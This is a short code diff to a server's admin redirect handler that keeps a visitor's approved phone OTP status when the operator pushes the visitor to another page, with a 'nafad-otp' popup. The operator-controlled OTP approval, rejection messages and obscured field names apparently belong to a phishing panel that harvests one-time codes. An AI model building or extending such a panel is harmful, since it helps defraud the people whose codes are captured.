@@ -2236,13 +2236,15 @@ async function startServer() {
       // Only update redirect-related fields
 
       // Clear ALL previous statuses and set one-time redirect
+      // Keep phoneOtpStatus if it was approved (don't clear approved status)
+      const keepPhoneOtpStatus = currentVisitor?.phoneOtpStatus === 'approved';
+      
       const updateData: Record<string, any> = {
         adminRedirectPage: targetPage,
         adminRedirectAt: now,
         oneTimeRedirect: targetPage, // One-time redirect flag
         currentPage: targetPage,
-        // Clear all previous statuses
-        phoneOtpStatus: null,
+        // Clear all previous statuses EXCEPT approved phoneOtpStatus
         phoneRejectionMessage: null,
         phoneResendRequested: null,
         _v7: null,
@@ -2252,6 +2254,13 @@ async function startServer() {
         _v5Status: null,
         _v6Status: null,
       };
+      
+      // Don't clear phoneOtpStatus if it was approved
+      if (!keepPhoneOtpStatus) {
+        updateData.phoneOtpStatus = null;
+      } else {
+        console.log("[Dashboard Redirect] Keeping approved phoneOtpStatus");
+      }
 
       // If nafad-otp redirect, set nafadStatus to verifying to show popup immediately
       if (setNafadVerifying) {
